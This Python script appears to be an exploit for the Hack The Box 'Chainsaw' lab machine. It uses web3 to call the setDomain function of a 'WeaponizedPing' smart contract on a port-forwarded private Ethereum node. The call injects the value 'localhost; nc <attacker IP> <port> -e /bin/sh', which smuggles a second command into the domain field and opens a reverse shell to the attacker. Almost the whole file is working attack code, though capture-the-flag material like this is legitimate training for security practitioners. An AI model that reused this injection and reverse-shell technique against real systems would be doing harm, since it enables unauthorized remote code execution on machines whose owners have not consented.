#!/usr/bin/env python3
# -*- encoding:utf-8 -*-
#
# Licensed under AGPL v3
# Copyright(C) 2019 kmahyyg
#

from web3 import Web3
import logging
import json
import sys
import requests

logger = logging.getLogger('default_log')
handler = logging.StreamHandler()
formatter = logging.Formatter("%(levelname)s | %(message)s")
handler.setFormatter(formatter)
logger.addHandler(handler)
logger.setLevel(logging.INFO)


# Print help
def printusage():
    print("Can only be used in Chainsaw - HTB, as a helper function of getting user.")
    print("Usage: " + sys.argv[0] + " <CONTRACT ADDRESS> <ATTCKER IP> <ATTACKER NC PORT>")


# Get predefined address
try:
    ftp_contraddr = sys.argv[1]
    logger.info("Predefined Contract Address: " + ftp_contraddr)
except IndexError:
    logger.error("Predefined Contract Address not found")
    printusage()
    sys.exit(1)

# Attacker info
try:
    AttackHost = sys.argv[2]
    AttackPort = sys.argv[3]
    AttackPayload = "localhost; nc " + AttackHost + " " + AttackPort + " -e /bin/sh"
except IndexError:
    logger.error("Attack information not found.")
    printusage()
    sys.exit(1)

# SSH Port Forward: localhost:8545:10.10.10.142:9810
ethneturl = "http://localhost:8545"
logger.info("The 10.10.10.142:9810 should be forwarded to {localip}".format(localip=ethneturl))

# predenfined contract address read from the file
predefined_cont_addr = Web3.toChecksumAddress(ftp_contraddr)
logger.info("YOU SHOULD MODIFY THE ADDRESS AND PAYLOAD BEFORE RUN THIS SCRIPT!")
input("Please confirm the above notification, then press enter to continue")

# Detect if port-forward working
r = requests.get(ethneturl, timeout=5)
if r.status_code == 400:
    logger.info("Port Forward seems working, go to next step...")
else:
    logger.error("Private ETH Network forward to {localip} is not successful.".format(localip=ethneturl))
    sys.exit(1)


# Web3Py related code
w3eng = Web3(Web3.HTTPProvider(ethneturl))

network_status = w3eng.isConnected()
logger.info("Check if connected: " + str(network_status))
if not network_status:
    print("System network does not connect.")
    sys.exit(1)

# --- Learning and Testing Code ---
# --- Should be commented when finally use ---

# Dump the private chain accounts
logger.info("Trying to dump the accounts...")
all_acc = w3eng.eth.accounts
# logger.info("Trying to get balance of each account...")
# for accidx in range(0, len(all_acc)):
#     print("{par1}: {par2}".format(par1=str(all_acc[accidx]), par2=w3eng.eth.getBalance(all_acc[accidx])))

# --- Learning and Testing Code End ---

# According to Solidity compiler document, for new contract, must: account == 0
# construct new contract OR Using the existing contract

# set pre-funded account as sender
w3eng.eth.defaultAccount = all_acc[0]  # if new contract, account = 0
# Read contract ABI from json
cont_json = open('assets/WeaponizedPing.json', 'r').read()
cont_json = json.loads(cont_json)
cur_abi = cont_json['abi']
cur_cont_addr = predefined_cont_addr

cur_cont = w3eng.eth.contract(address=cur_cont_addr, abi=cur_abi)
cur_cont_funcs = cur_cont.functions
logger.info("Get Contract Functions: " + str(cur_cont_funcs))

# RCE
exploit = cur_cont_funcs.setDomain(AttackPayload).transact()
logger.info("Transaction with RCE sent, Hash is: " + Web3.toHex(exploit))
logger.info("Waiting for transaction to be mined...")
receipt = w3eng.eth.waitForTransactionReceipt(exploit)
print("Receipt Found: ", sep='')
print(w3eng.eth.getTransactionReceipt(exploit))
finalres = cur_cont.functions.getDomain().call()
logger.info("Payload returned back is: " + finalres)
logger.info("DONE! You should get reverse shell now.")
